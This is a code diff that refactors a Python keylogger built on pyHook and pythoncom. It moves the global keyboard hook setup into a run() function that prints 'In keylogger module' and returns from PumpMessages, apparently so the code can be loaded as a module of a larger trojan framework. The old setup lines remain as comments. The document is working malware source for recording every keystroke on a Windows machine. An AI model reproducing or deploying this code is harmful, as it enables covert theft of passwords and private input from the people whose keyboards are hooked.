@@ -66,10 +66,23 @@ def KeyStroke(event):
     return True
 
 
-# create and register a hook manager
-kl = pyHook.HookManager()
-kl.KeyDown = KeyStroke
+def run(**args):
 
-# register the hook and execute forever
-kl.HookKeyboard()
-pythoncom.PumpMessages()
+    print("[*] In keylogger module.")
+    # create and register a hook manager
+    kl = pyHook.HookManager()
+    kl.KeyDown = KeyStroke
+
+    # register the hook and execute forever
+    kl.HookKeyboard()
+    return str(pythoncom.PumpMessages())
+
+    #return str(files)
+
+# # create and register a hook manager
+# kl = pyHook.HookManager()
+# kl.KeyDown = KeyStroke
+#
+# # register the hook and execute forever
+# kl.HookKeyboard()
+# pythoncom.PumpMessages()
